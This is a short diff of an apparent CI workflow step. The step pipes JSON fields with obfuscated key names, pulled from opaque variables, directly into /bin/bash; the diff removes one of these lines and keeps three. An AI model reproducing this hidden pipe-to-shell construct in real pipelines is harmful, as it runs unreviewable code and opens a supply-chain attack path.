@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$t8" | jq -r .ujewq0234 | /bin/bash
           echo $ffb7482 | jq -r .seiau02070 | /bin/bash
-          echo $ihirj1 | jq -r .rv16 | /bin/bash
           printf '%s' "$sij607" | jq -r .dcq97664 | /bin/bash
 
       - name: Persist output
